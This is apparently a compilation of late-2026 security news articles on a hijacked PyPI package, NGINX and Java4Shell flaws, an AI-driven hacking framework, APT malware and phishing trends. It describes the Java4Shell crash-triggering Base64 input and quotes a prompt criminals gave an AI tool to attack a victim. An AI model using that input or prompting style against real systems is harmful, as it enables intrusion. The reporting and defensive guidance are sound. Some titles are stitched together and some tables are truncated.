Title: Microsoft's official Python agent framework hijacked to distribute malware
Context: Microsoft’s official agent framework package hosted on PyPI has been hijacked and now installs info-stealing malware, multiple security research firms have discovered
Full Text: Microsoft’s official agent framework package hosted on PyPI has been hijacked and now installs info-stealing malware, multiple security research firms have discovered. CEO Satya Nadella may be on stage trying to wow investors and customers at his company’s annual Ignite conference, but somewhere in the bowels of a building in Redmond his open source team is likely panicking at what appears to be unauthorized access to an administrator account on Microsoft’s Github organization. The problem package is Microsoft’s agent-framework, versions 1.26.1 and 1.26.2, researchers reported late yesterday and this morning. According to OX Security, version 1.26.1 was reverted to a safe version, but the attacker later uploaded 1.26.2 through Microsoft’s official PyPI publisher account, suggesting that, at least at the time of their report, the credentials hadn’t been locked down. Safe to say, but if you find either version in your environment assume you have some account security work to do. Microsoft agent-framework for Python boasts nearly 200,000 downloads a month and is used to build and deploy AI agents. As of those latest releases, it’s also being used to exfiltrate environment variables, credential files, and other secrets for Azure, Git, Docker, Hugging Face, and other sensitive developer services. To make matters worse, the package never needs to be imported to do its dirty work – all it takes is a Python interpreter with the package installed to start up – the infected package still pulls the genuine 1.26.0 version of Microsoft’s agent-framework in order to keep itself running and looking legitimate, while in the background it gathers up credentials, encrypts them as a base64-encoded chunk of JSON, and sends them off to a webhook.site address hard coded into the malware. It appears from researcher accounts that this is made to act fast, as the malware isn’t persistent and only runs as long as the malicious version of the agent-framework remains in a site-packages directory. What it does do, however, is not just look for credentials in the environment: It actually starts calling for new ones and collecting them, too. In particular, the malware requests fresh identity tokens from GitHub Actions, Azure DevOps, and Azure itself, which are exfiltrated to the same webhook site. “That combination of passive theft and active token requests makes it especially dangerous in cloud build environments, because even short-lived tokens are useful when they're exfiltrated right away,” said researchers at OpenSourceMalware. The agent-framework GitHub repo is offline as of writing. It’s been pointed out online that Microsoft’s repo for ONNX Runtime, an AI accelerator, is also offline. Other Microsoft repos remain available, and neither Microsoft nor security researchers have linked the ONNX repo’s pull to the malware campaign. “We have made some repositories private while we investigate malicious content,” a Microsoft spokesperson told The Register. “Our priority is to protect customers and the broader ecosystem. We are working to review and will take further action as needed.”® Updated at 1805 with comment from Microsoft.

Title: Five Critical Vulnerabilities Found in World's Most Widely Used Open-Source Web Server
Context: It can allow attackers to exploit memory-handling flaws in the request-processing path CVE-2026-121810: a vulnerability affecting NGINX servers using HTTP/3 (QUIC) with upstream...
Full Text:
Several security research teams have independently discovered five new critical vulnerabilities in NGINX, the world's most widely used open-source web server that powers more than 225 million websites worldwide.

The flaws could lead to attackers remotely taking control of NGINX-based websites without being authenticated.

On November 18, security researchers at Google Cloud-owned Wiz, Ikotas Labs, Metnir, Rapid7 and Xint all disclosed several vulnerabilities in NGINX 1.31.8, the current release.

The set of vulnerabilities includes CVE-2026-113425, CVE-2026-121810, CVE-2026-123007, CVE-2026-123633 and CVE-2026-123634 – all with a critical severity rating of 9.2 (CVSS 4.0).

However, the number of flaws reported differs between their disclosures. Ikotas Labs has highlighted one vulnerability, which it calls ‘NGINX2Shell,’ while Wiz researchers have detailed two vulnerabilities, identified as CVE-2026-123007 and CVE-2026-123633. Xint, meanwhile, has documented five vulnerabilities under the collective name ‘NGINX2Root.’

Some of these research teams have publicly disclosed they used AI models and collaborated with OpenAI to find these vulnerabilities.

Wiz Report: CVE-2026-123633 and CVE-2026-123007

CVE-2026-123633 is a use-after-free vulnerability that can cause memory corruption, while CVE-2026-123007 involves an integer underflow in HTTP/2 flow control. Both could allow unauthenticated attackers to execute arbitrary code remotely on vulnerable servers.

According to Wiz, both vulnerabilities affect a wide range of NGINX versions, with one dating back to 2015 and the other to 2020. Exploitation requires HTTP/2 to be enabled.

Wiz said it reported the flaws to F5, the maintainer of NGINX, which has since addressed both flaws in NGINX Open Source 1.30.7 (stable) and 1.31.9 (mainline).

Administrators unable to upgrade immediately are advised to disable HTTP/2 until the patches can be applied.

Xint’s Added Details for CVE-2026-113425, CVE-2026-121810 and CVE-2026-123634

In addition to the two HTTP/2 vulnerabilities identified by Wiz, Xint disclosed three further NGINX vulnerabilities as part of its NGINX2Root research:

CVE-2026-123634: a vulnerability affecting NGINX configurations using the resolver, proxy_pass and mirror directives together with mirror_request_body off. It can allow attackers to exploit memory-handling flaws in the request-processing path

CVE-2026-121810: a vulnerability affecting NGINX servers using HTTP/3 (QUIC) with upstream proxy connections, including configurations using proxy_pass, fastcgi_pass or grpc_pass. It creates another potential route to remote code execution

CVE-2026-113425: a vulnerability affecting NGINX Mail Proxy deployments using the proxy and auth_http directives. It exposes servers using this functionality to a separate attack path

All three additional vulnerabilities are addressed by the NGINX 1.31.9 release, but administrators and operators are advised to consult the individual advisories for configuration-specific mitigations.

Xint said each of the five NGINX vulnerabilities has a proven exploit, although the precise configuration requirements and affected versions differ.

The security company also said that, while it had no evidence of exploitation in the wild at the time of publication, the age of some vulnerabilities means exploitation cannot be ruled out.

The CVEs are listed on a number of CVE databases including OpenCVE and CVE.org.

Title: Java4Shell Flaw Threatens Global Enterprises, Java Application Ecosystem
Artex Is Criminals’ New Favorite ‘Point-and-Shoot’ AI Hacking Tool
Context: Over the past year, security researchers have warned that AI agents could vastly speed up cybercriminals’ ability to launch cyberattacks, breach companies, and ultimately steal...
Full Text:
Over the past year, security researchers have warned that AI agents could vastly speed up cybercriminals’ ability to launch cyberattacks, breach companies, and ultimately steal money, data, or sensitive information from those compromised systems. For at least one subset of hackers, it appears that era has now arrived.

Since around the end of August, multiple companies, government agencies, and banks around the world have been targeted by cybercriminals adopting a new wave of AI-powered penetration testing tools. These setups​​—many of which mimic legitimate defensive penetration testing techniques—use LLMs to autonomously scan potential hacking targets and attempt to force their way into poorly secured networks, then carry out attack plans written by human operators.

Dozens of these AI penetration frameworks or “harnesses,” which detail how an AI model should carry out cybersecurity testing or attacks, are increasingly being linked to real-world attacks. The tools do not introduce new ways to attack websites or servers and are not sophisticated, according to alerts from around half a dozen security companies. Instead, they allow cybercriminals to launch attacks at speeds that would be impossible for humans to do.

Hackers also don’t need to be skilled to use the tools, researchers say, and attacks that would have taken days are completed in just hours. “Agentic frameworks have progressed from experimental use to sustained, multi-objective offensive operations that run with minimal human intervention,” CJ Moses, AWS’s chief information security officer, wrote in a company blog post recently.

The most prominent of these tools is Artex. Written in the programming language Go, the open-source framework was first published on GitHub in July by a pseudonymous developer using the handle Autumn-27, and it’s been spreading across some hacker communities ever since. Artex has been used across all parts of attacks, from conducting initial analysis of networks and gaining access to moving within systems and preparing data to be exported.

“It’s really an all-in-one product,” says Jacob Larsen, an offensive security researcher and founder of security firm Cypen. “Previous iterations of AI agent pen-testing tools would either only do reconnaissance—like the scanning and analysis [of targets]—and some would only do testing. This is really a point-and-shoot weapon.”

As with other AI hacking frameworks, Artex isn’t an AI product itself. Instead, it is essentially a guide that points external frontier and open-source AI models—that can be connected to it via APIs—to a series of existing penetration testing tools and processes. People using Artex or other similar setups can give simple, natural-language prompts to begin their operations. “Launch a penetration attack on [Redacted victim] to gain access to the site’s admin panel, database, or server,” one set of hackers prompted Artex, according to researchers at the security firm Check Point.

Title: Most SecOps Leaders Are Changing the L1 Role as Agent Use Grows
Context: Half (49%) of respondents said they’re hiring for new skills like AI detection engineering and automation, while two-fifths (42%) are retraining L1 analysts to supervise agents
Full Text:
The vast majority (87%) of security leaders are redesigning their security operations centers (SOCs) because of AI agents, but roles are being adapted rather than eliminated, according to Strike48.

The security startup polled 534 security and IT leaders at organizations with 200 or more employees and a security operations function in the UK, Canada and US to produce its latest report: The State of Agentic Security H2 2026.

It revealed that agents have already gone mainstream and 74% of respondents said they have deployed the technology in their SOC, up from 36% in May. Half (49%) are using it in multiple use cases.

However, L1/Tier-1 analysts are being redeployed rather than replaced. Half (49%) of respondents said they’re hiring for new skills like AI detection engineering and automation, while two-fifths (42%) are retraining L1 analysts to supervise agents.

A slightly smaller share (38%) are moving L1s into investigation roles while 30% are even growing their team with more entry-level analysts.

Read more: AI SOCs Will Still Need SOC Analysts, Security Vendors Say

The findings will allay common concerns in the industry that AI will take the roles of entry-level SecOps employees, eliminating a vital career on ramp.

A Swimlane report from September revealed that a quarter (24%) of SOC analysts feel the technology has limited their ability to build skills. One in 10 said they expect fewer opportunities for junior analysts to gain experience.

Building Trust for Autonomy

The report also highlighted that, despite widespread adoption of agents in the SOC, a lack of trust is constraining organizations' ability to make the most of deployments.

Only 30% of teams claim to allow their agents to act with high or full autonomy, while half (47%) keep humans executing actions or preapproving them, and a quarter (23%) let agents act within defined boundaries.

Trust seems to rise as use cases expand and governance is put in place. Respondents’ top five requirements for trusted autonomy are:

Proven accuracy in their environment over time (57%)

A full audit trail of every action and the data behind it (53%)

Technical enforcement that the agent cannot exceed limits, not just instructions telling it not to (46%)

A precisely defined scope for each agent (44%)

A reliable rollback or undo for any action (40%)

“Most teams start the same way: one agent, one long prompt telling it to act like a Level 1 analyst, and a pile of tools bolted on. Then it meets a real alert queue, and you find out a single prompt can’t carry an entire triage process. In my view, this is why distrust of agent outputs is highest for teams with just one use case,” Tim Leehealy, co-founder and president, Strike48, told Infosecurity.

“I’d argue the models are mature enough. What’s immature is how most teams use them. The SOC teams that get to agent autonomy break the work into narrow jobs and fixed, deterministic workflow steps.”

Title: Suspected Chinese APT Rebuilds EggStreme Malware After Exposure
Context: A suspected Chinese advanced persistent threat (APT) group rebuilt parts of the EggStreme malware framework after it was exposed by Bitdefender
Full Text:
A suspected Chinese advanced persistent threat (APT) group rebuilt parts of the EggStreme malware framework after it was exposed by Bitdefender. The company said the timing suggested its report was a likely trigger.

Bitdefender detailed the changes in an update to its cyberespionage research, first published in September 2025. It made no new attribution claim. It assessed with high confidence that the operation targeted multiple Philippine government organizations and with low to medium confidence that it targeted Taiwan, calling the latter a lead, not an established fact.

In the original research in September 2025, Bitdefender found a Chinese APT group had compromised a Philippines-based military firm using the EggStreme fileless malware framework.

What the Operators Changed

EggStremeFuel, one of the framework's components, changed how it protected its configuration in a build compiled 12 days after the original report, Bitdefender said.

Two weeks after that, the operators compiled a loader with a new cipher and payload format. That cipher was replaced again by late October 2025, swaps Bitdefender said offered little real protection but still defeated detections built for the old cipher.

The EggStremeAgent backdoor dropped its previous protocol for raw TCP connections still secured with mutual TLS, in which both sides present certificates.

Newer builds added Windows domain mapping and in-memory PowerShell, and none of those analyzed carried the keylogger. Two of them ran in passive mode, waiting for the operators to connect rather than calling out. Bitdefender first saw these builds after the report, though some were compiled earlier.

Bitdefender said the framework's design, which let operators swap capabilities with a new build, appeared to explain the speed.

Read more on Chinese cyberespionage: Suspected Chinese Malware Supplier Tied to Three Hacking Campaigns

What Defenders Can Still Track

Older EggStreme servers traced back to one certificate authority, created in 2019 and linked to 32 domains. No new domains appeared under it after the report. Newer activity suggested a shift to campaign-specific ones, which Bitdefender said was unconfirmed, though some links between old and new infrastructure remained.

Despite the rebuild, four behaviors stayed constant: DLL sideloading (getting a legitimate program to load malicious code), movement through file shares, in-memory execution and mutual TLS. Bitdefender said the operators "spent at the tools level and kept their methods."

Bitdefender's recommendations included restricting built-in Windows tools an environment did not need, detecting DLL sideloading by library name and location, finding unmanaged machines that could still reach workstations and watching for new inbound listeners on workstations.

The company argued that exposure could cost operators more than one campaign, since tooling is often shared. It said that raised a question about handing such operations to autonomous AI tools, where the chance of discovery was high, though its data did not test it.

Title: Major Brazilian Signature Apps Enable RCE & Fraud
Java4Shell (CVE-2026-114938): Who’s Exposed and How to Fix It
Context: The flaw isn't in CISA's Known Exploited Vulnerabilities catalog, Canada's Cyber Centre said it wasn't aware of attacks, and Calif is holding back its exploit code
Full Text:
Java4Shell, tracked as CVE-2026-114938, is a heap overflow in Java's hardware-accelerated Base64 decoder. Researchers at Calif say it can let attackers without an account run code on Jira, Jenkins, Keycloak and other Java applications. Oracle and the OpenJDK project shipped fixes on Nov. 17, 2026, and CISA urged organizations to patch immediately. No exploitation in the wild has been reported.

Patch it, but read the conditions before you rank it next to Log4Shell. The vulnerable code runs only on x86-64 servers whose processors support AVX-512 VBMI, so a server's exposure depends on its CPU as much as its Java version. The same container image can be vulnerable on one host and safe on the next, and that is the detail most patch plans will miss.

Which Java versions and servers are affected?

A server is exposed only when three conditions hold at once.

1. A vulnerable Java build. Java 17.0.6 and later on the 17 line, plus Java 21, 25 and 27 before the November fixes. Standard Java 8 and 11 don't contain the flawed code, but the Java SE 8 Performance Pack build 8u511b33-perf does, as do recent GraalVM builds.

2. The right CPU. The vulnerable path runs only on x86-64 chips with AVX-512 VBMI: Intel Xeon Ice Lake, Sapphire Rapids, Emerald Rapids and Granite Rapids, and AMD Zen 4 or newer. ARM64 servers, including AWS Graviton, don't run it. On Linux, this command should print all four flags if the chip qualifies:

grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n' | grep -E '^(avx512f|avx512bw|avx512vbmi|bmi2)$'

3. A reachable decoder. An attacker has to get malformed Base64 into Java's standard decoder. Many servers decode Base64 before checking who you are, in HTTP Basic login headers, SAML artifacts and CSRF tokens, which is what makes the attack possible without a login.

Calif reports pre-authentication code execution under default settings on Keycloak, Atlassian Jira, Atlassian Confluence, JFrog Artifactory, Jenkins and PingFederate, and with a login on Apache Kafka, Apache Solr, Elasticsearch, Gerrit and Spinnaker. It says the list is incomplete.

Java build

17.0.21.1.2, 21.0.13.1.2, 25.0.5.1.2, 27.0.1.1.4

Red Hat build of OpenJDK and RHEL 8, 9, 10

Products that bundle their own Java runtime, from CI servers to appliances, need an update from their vendor, not just a new system JDK.

How Java4Shell works

When a method runs often enough, Java's JIT compiler swaps the standard Base64 decoding loop for a hand-tuned assembly routine, an "intrinsic," that uses AVX-512 VBMI instructions. That routine miscalculates the output size when the input ends with an unexpected = padding character. Wiz gives the example of 64 A characters followed by a single =.

The result is a write of 62 or 63 bytes past the end of the output array on the Java heap. Java does reject the malformed string, but only after the write has happened. That ordering is the whole bug: input validation in your application can't help, because the damage is done inside the decoder.

The overflowed bytes are fixed by the decoder, which is why early readings predicted a crash, not code execution. Calif's researchers got around that by arranging heap memory so the overflow enlarges a neighboring array. They then used that array to write chosen bytes and a second array to read memory back, a step they call JavaBleed, and worked from there to code execution.

There is no universal exploit. Each application needs its own memory layout and timing, and some attempts are sensitive to network delay. A failed attempt usually crashes the JVM, and an attacker can often try again.

One uncomfortable footnote: a pull request to OpenJDK on Sept. 9 described an overflow in the same decoder and included a triggering input. It was closed unmerged in early November after eight weeks of inactivity.

Is Java4Shell being exploited, and why do the scores disagree?

As of Nov. 18, 2026, no exploitation has been reported. The flaw isn't in CISA's Known Exploited Vulnerabilities catalog, Canada's Cyber Centre said it wasn't aware of attacks, and Calif is holding back its exploit code.

Independent labs have confirmed the dangerous part, though. Upwind reproduced the memory corruption on an Intel Ice Lake server on AWS until Java crashed. Blackpoint Cyber crashed a test Spring Boot app with about 28,300 malformed login requests in roughly 20 seconds, without logging in, and used the JavaBleed technique to read a secret from memory in all 30 local runs. Neither reproduced remote code execution.

That split explains the scores:

Source

What it emphasizes

8.1 (CVSS 3.1)

No login required, but hard to exploit

The practical read: a pre-auth crash of any affected Java service is easy today. Reliable code execution takes per-target work, but the researchers have shown it can be done, and the triggering input has been public since September. Treat it as urgent.

How to fix and mitigate Java4Shell

Find every affected runtime. Inventory Java 17 and later, including runtimes bundled inside products. Then check the CPU on each host with the command above. Mixed fleets and autoscaling groups can change exposure from one instance to the next.

Patch. Install the fixed build for your distribution from the table above, then restart Java services and rebuild and redeploy container images so the running process actually uses it. Red Hat users need the workaround until Red Hat ships fixes.

If you can't patch yet, turn off the vulnerable path. Start the JVM with -XX:-UseBASE64Intrinsics, which removes only the faster Base64 code. -XX:UseAVX=2 disables AVX-512 entirely, but use it only on x86-64, because Java on ARM64 won't start with it. Upwind warns that -XX:DisableIntrinsic=_base64_decodeBlock on its own stops Java from starting. Remove the flag once the fixed build is in.

Reduce exposure at the edge. CISA recommends validating Base64 input at application boundaries, enforcing input-size limits and limiting unauthenticated access. A reverse proxy that buffers complete requests, as nginx does by default, blocks some attacks but not all.

Hunt for attempts. Look for Base64 tokens of 32 characters or more that end in = and whose length isn't a multiple of four, especially in Authorization headers; bursts of IllegalArgumentException from java.util.Base64$Decoder; and unexplained hs_err_pid crash logs or restart storms. None of these proves a compromise, and their absence doesn't prove you're safe.

Frequently asked questions

What is Java4Shell (CVE-2026-114938)?

Java4Shell is a heap buffer overflow in the AVX-512 Base64 decoder of OpenJDK's HotSpot JVM on x86-64. Malformed Base64 ending in an extra = makes the decoder write 62 or 63 bytes past its output buffer. Calif, which disclosed it on Nov. 17, 2026, demonstrated unauthenticated code execution against six widely used Java applications.

Which Java versions are affected?

Java 17.0.6 and later on the 17 line, and Java 21, 25 and 27 before the November 2026 fixes. Fixed Oracle builds are 17.0.21.1, 21.0.13.1, 25.0.5.1 and 27.0.1.1. The server must also have an x86-64 CPU with AVX-512 VBMI, such as Intel Xeon Ice Lake or later, or AMD Zen 4 or later.

Are Java 8 and Java 11 affected?

Standard Java 8 and 11 builds don't contain the vulnerable code. The exception is the Java SE 8 Performance Pack build 8u511b33-perf, which is affected; Oracle's latest Performance Pack build is 8u513.

Is CVE-2026-114938 being exploited?

No exploitation in the wild had been reported as of Nov. 18, 2026, and the flaw wasn't in CISA's Known Exploited Vulnerabilities catalog. Independent labs have reproduced crashes and memory reads but not remote code execution.

Is Java4Shell as bad as Log4Shell?

It's narrower. Log4Shell could be triggered by almost any logged string on any hardware with a simple, reliable exploit. Java4Shell needs specific CPUs, a reachable Base64 decoder and target-specific exploitation work. A pre-auth crash is easy, though, so treat it as urgent.

How can I mitigate Java4Shell without patching?

Start the JVM with -XX:-UseBASE64Intrinsics to disable the vulnerable decoder path, or -XX:UseAVX=2 on x86-64 only. Add input-size limits and Base64 validation at the edge, and remove the JVM flag once you've installed a fixed build.

Title: Java4Shell Vulnerability Allows Remote Attacks on Major Java Apps
Context: Java4Shell: A Hardware-Bound Exploit Despite the criticality and widespread impact of Java4Shell, several security firms noted that the vulnerability is difficult to exploit
Full Text:
Weeks after PHP2Shell, another critical vulnerability has been leaked before its planned disclosure and authorities are now urging organizations to apply patches.

The new vulnerability, known as ‘Java4Shell’ and tracked as CVE-2026-114938, is a memory corruption vulnerability in Open Java Development Kit (OpenJDK), an open-source implementation of the Java Platform, Standard Edition (Java SE) co-maintained by Oracle and a global community of developers and companies, such as Red Hat, Amazon and Microsoft. OpenJDK runs most Java applications.

The vulnerability was found by California-based security firm Calif, which published details on November 17 after some information was leaked before coordinated disclosure.

The flaw affects OpenJDK 17, 21, 25 and 27 and is rated with a high-severity score of 8.1 by Oracle (using CVSS v3.1) and a critical severity score of 9.2 by Calif (using CVSS v4.0).

The exploitation of Java4Shell can allow unauthenticated attackers corrupt memory in Java servers with a single malformed message.

According to a write-up from Calif, the blast radius of a potential exploit could be broad, with many Java-based applications built on OpenJDK also vulnerable.

Services vulnerable to a remote code execution (RCE) attack which has exploited Java4Shell include Keycloak, Atlassian’s products like Jira and Confluence, JFrog Artifactory, Jenkins and PingFederate as well as many distributions based on OpenJDK:

Amazon Corretto

Eclipse Temurin

Microsoft Build of OpenJDK

Azul Zulu

BellSoft Liberica

SAP SapMachine

Red Hat OpenJDK

Oracle OpenJDK

Oracle Java SE

Oracle GraalVM for JDK

Other services can also be vulnerable to a Java4Shell exploit, but only if the attacker is able to authenticate. These include Apache Kafka Broker, Apache Solr, Elasticsearch, Gerrit and Spinnaker.

Maintainers of OpenJDK have published a fix, but each Java vendor will ship its fixed build on its own schedule.

The US Cybersecurity and Infrastructure Security Agency (CISA) published an emergency advisory on November 17 urging organizations to apply patches as soon as they are available.

Java4Shell: A Hardware-Bound Exploit

Despite the criticality and widespread impact of Java4Shell, several security firms noted that the vulnerability is difficult to exploit.

In two separate reports, VulnCheck and Endor Labs highlighted that exploitation of the vulnerability is hardware-specific, depending on the Java version, the underlying server processor and the application running on it.

Both research teams noted that the flaw affects CPUs supporting AVX-512 VBMI instructions, while ARM-based servers, including AWS Graviton, are not affected.

VulnCheck said its researchers had successfully reproduced the vulnerability on Ice Lake hardware, adding that processors without AVX-512 VBMI and BW support use an alternative decoding path that does not contain the defect.

Endor Labs noted that the affected processors include recent Intel and AMD server chips, which account for much of current cloud capacity.

As of November 18, no attacks exploiting the vulnerability had been reported in the wild.

CISA Mitigation Recommendations

CISA recommended the following mitigation measures:

Identify affected Java installations: review software inventories for Java Development Kits (JDKs) and Java runtimes, including those bundled with third-party applications, container images and appliances, as they may not appear as separate inventory entries

Apply security patches: install relevant Java and vendor patches as soon as they become available, prioritizing internet-facing systems

Implement safeguards: where immediate patching is not possible, implement temporary safeguards, such as validating and restricting Base64 input at application boundaries, enforcing input-size limits and limiting unauthenticated access

Review vendor guidance: consult Oracle’s security advisory for additional patching instructions and recommendations

Monitor for suspicious activity: watch for indicators of potential exploitation, including rogue Java runtimes, unexpected Java Virtual Machine (JVM) crashes and suspicious Java processes

Title: CISA Adds Four Known Exploited Vulnerabilities to Catalog
Context: While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog...
Full Text:
CISA has added four new vulnerabilities to its Known Exploited Vulnerabilities (KEV) Catalog, based on evidence of active exploitation.

CVE-2024-10441 Synology DiskStation Manager (DSM) Improper Encoding or Escaping of Output Vulnerability

CVE-2026-40217 BerriAI LiteLLM Unprotected Alternate Channel Vulnerability

CVE-2026-90436 Apache Axis Unsafe Reflection Vulnerability

CVE-2026-90817 Vanderbilt University Research Electronic Data Capture (REDCap) Code Injection Vulnerability

These types of vulnerabilities are a frequent attack vector for malicious cyber actors and pose significant risks to the federal enterprise.

Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied.

While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities. CISA will continue to add vulnerabilities to the catalog that meet the specified criteria.

Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form. Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.

Title: Three AI Models Agree on Just One of 121 Potential Code Flaws
Context: " If an attacker hunts with one model and a defender relies on another, he said, "the defender might never even see the vulnerability the attacker is about to exploit
Full Text:
Three frontier AI models given the same open source code to audit have produced vulnerability findings that barely overlap, according to new frontier AI research. Of 121 distinct potential issues, Anthropic's Claude Mythos 5.1, OpenAI's GPT-5.6 Sol and Z.ai's GLM-5.3 all flagged just one, software security firm Echo found.

Echo published the comparison in its November 18 research. Each model worked through two Maven libraries and one npm package with Echo's own hunting framework and the same validation process. Echo reached GPT-5.6 Sol through Daybreak, the program OpenAI runs for vetted security teams.

Of the 121 issues, 83% (100), came from a single model and 20 from the other two.

Read more on AI vulnerability discovery: AI Cuts Vulnerability Discovery from Nine Months to 90 Hours

Where the AI Models Disagreed

Claude Mythos logged the most validation passes overall, with 25, against nine for GLM-5.3 and eight for GPT-5.6 Sol. But GPT-5.6 Sol accounted for six of the seven passes on one Maven library, and GLM-5.3 found six validated issues on the other that its rivals missed.

Severity ratings split too. GLM-5.3 rated one flaw in an npm package with more than 350 million monthly downloads as Critical, Claude Mythos put it at High and GPT-5.6 Sol treated it as documented behavior rather than a bug. Automated validation rated it Low.

GPT-5.6 Sol finished its hunts in about 24 minutes, against roughly 198 for Claude Mythos and 174 for GLM-5.3. GLM-5.3 was the cheapest overall, with its three hunts costing about $22, against $303 for Claude Mythos and $30 for GPT-5.6 Sol, though Echo said the costs reflected its own access terms.

How Many AI Findings Held Up

The nine runs produced 446 initial findings, cut to 152 after cleanup. Of those, 74 were rated High or Critical, and 55 went through automated proof-of-concept testing after duplicates were set aside. Forty-two passed.

Echo cautioned that the 42 were not necessarily distinct bugs, since an issue found by more than one model could be credited to each. Findings rated Medium or Low were never tested, so a previously known flaw that Claude Mythos rated Medium never reached validation.

Echo security researcher Yuval Saggie said the race to find the best model was "the wrong question." If an attacker hunts with one model and a defender relies on another, he said, "the defender might never even see the vulnerability the attacker is about to exploit."

Each model ran only once, and Echo called the exercise "a controlled comparison rather than a comprehensive benchmark." It said automated validation did not amount to confirmation from the projects' maintainers.

Echo said the projects would stay unnamed, and technical details unpublished, until their maintainers had been notified.

Title: The Silent Consensus
Watchdog Warns UK Government Is Falling Short on Risk Management
Context: The spending watchdog published its report, Risk management in government: improving capability and decision making, on November 18
Full Text:
The number of chief risk officers (CROs) in UK government has more than doubled over the past decade, but most industry professionals working in Whitehall believe they lack influence, according to a new National Audit Office (NAO) report.

The spending watchdog published its report, Risk management in government: improving capability and decision making, on November 18.

It noted that effective risk management is important in helping to manage fast emerging risks, like the recent PHP vulnerabilities, which have the potential to disrupt public services and lead to costly recovery work.

It can also “help public bodies make better decisions, adapt to uncertainty and take well-managed risks to innovate and improve services,” the NAO argued.

However, 58% of risk professionals it polled claimed they are typically brought in too late to shape decisions.

“We found limited evidence of major decisions or organizational direction changing because of input from risk professionals,” the report noted. “In hierarchical organizations, the often low seniority of those leading risk teams can also restrict their access to senior decision-making forums.”

Read more on risk management: 75% CISOs Fear Executives Don’t Understand Cybersecurity Risks Employees Face

In the cyber sphere, a lack of skills and awareness are undermining efforts to embed risk more fully in decision making, the report found.

For example, Audit and Risk Assurance Committees (ARACs) should provide independent advice and challenge the board and accounting officer. But the report noted that “skills gaps among committee members in evolving areas such as cybersecurity” are constraining their effectiveness.

Additionally, leaders don’t always understand the cyber risks outlined in risk registers “or recognize how they relate to their strategic objectives,” the NAO said.

Many government departments are at least defining their risk appetite, but less than half (47%) of those polled said this actually informs decisions. In June 2026, most reported that the majority of their principal risks were outside their stated tolerance.

“Legacy technology and specialist staff shortages may constrain departments’ ability to bring cybersecurity risks within appetite,” the report noted.

In many cases, the result is that known risks aren’t being addressed promptly. The NAO highlighted the case of the British Library, which had already identified risks from growing third-party access to IT systems, but was breached before planned changes were implemented.

Risk Management Critical in Interconnected Environment

Progress is being made, but is uneven across government, with many bodies not making use of performance information, early warning indicators, or assurance mapping to monitor risk management efforts, the report argued.

This is more important than ever given today’s “complex and interconnected” risk environment, it said.

Only a continuous approach to risk monitoring and improvement will do, the NAO argued. This means ensuring risk registers are “robust and ‘living documents’ that reflect significant risks,” it said.

"The past few years have highlighted the scale and complexity of the risks facing government and how quickly they can escalate into crises, with lasting consequences for public services,” said Gareth Davies, head of the NAO.

“Whilst it has made good progress, the government must now put risk management at the heart of how it plans, spends and delivers, making sure that senior leaders are equipped to spot vulnerabilities early and to take well-manged risks to improve public services. This will become ever more important as more decisions and public spending are devolved.”

Title: Betrayed Expectations: Malware Delivery via Common Brands
Context: By: Jacob Malimban, Intelligence Team In the first half of 2026, Cofense Intelligence observed a 239% rise in phishing campaigns that weaponize brand names to deliver malware...
Full Text:
By: Jacob Malimban, Intelligence Team

In the first half of 2026, Cofense Intelligence observed a 239% rise in phishing campaigns that weaponize brand names to deliver malware onto corporate devices as compared to the first half of 2025. Adobe, the Social Security Administration, Docusign, the IRS, and Zoom are among the most abused. The names are familiar by design: employees who expect a routine document from a recognized sender appear more likely to click, and the borrowed credibility of those brands helps the emails slip past automated security filters. There are two primary ways that brands can be spoofed to deliver malware and abused legitimate remote access tools (RATs).

The first is the initial phishing email. The brand spoofed in the email is what sets the expectation for the context of the campaign. For example, threat actors have used lures such as a refund sent by the IRS (Figure 5) and a benefits-themed document sent by the Social Security Administration (Figure 3). When a victim expects a file but does not realize the sender is malicious, they are likely to click on a phishing link.

The second way a brand can be abused is through the filename. To trick victims, malware may be named “Social_Security_Administration_v02.4_EN_US.msi” (Figure 3) or “setup_Zoom.msi” (Figure 6), depending on the brand used in the phishing email. These malware files are often hosted on cloud services like Google or Amazon, which can bypass the organization’s security controls.

What makes this threat category particularly difficult to manage is that the tools being delivered are not traditional malware. ConnectWise RAT, Datto RMM, SimpleHelp, and similar products are the same software that many IT departments use for legitimate remote support. Threat actors favor them precisely because standard security systems are built to trust them.

Key Points

In the first half of this year, 18% of all malware delivery campaigns impersonated new brands not seen before.

Adobe is the most abused brand when delivering malware in the first half of 2026.

The malware downloaded usually has a filename matching the phishing email branding, like “Adobe software update.msi”.

Threat actors often abuse legitimate cloud services like Google or Amazon to distribute malware and bypass security controls.

94% of campaigns delivering malware abuse legitimate remote access tools (RATs).

Brand Campaign Volume

Malware delivering campaigns increased 239% in the first half of 2026 compared to the first half of 2025.

The top five brands account for around 24% of all malware delivery campaign volume in the first half of this year.

Figure 1: The relative proportion of brands spoofed in the first half of 2026.

In the first half of 2026, Cofense Intelligence identified brands like Adobe, Social Security Administration, Docusign, IRS, and Zoom being abused in malware delivery campaigns. Docusign and Adobe are part of normal organizational operations. These brands follow the trends first identified in 2021. Social Security Administration-spoofing and IRS-spoofing after April mark the trend of government themed phishing outside of the IRS tax season. Zoom has typically been abused to host documents with links to credential phishing pages—and rarely links to malware pages.

Adobe Spoofing Campaigns Delivering Malware

Adobe-spoofing phishing campaigns rank #1 by volume in the first half of 2026.

Adobe-spoofing phishing emails delivering malware experienced an 18-fold increase when compared to the first half of 2025.

Adobe-spoofing campaigns typically deliver ConnectWise RAT (44%), Datto RMM (16%), and GoTo RAT (7%).

These software are technically legitimate remote access tools (RATs) but can be abused by threat actors to gain unauthorized administrative access.

Figure 2: Adobe-spoofing website claiming a software update is necessary (ATR 415874).

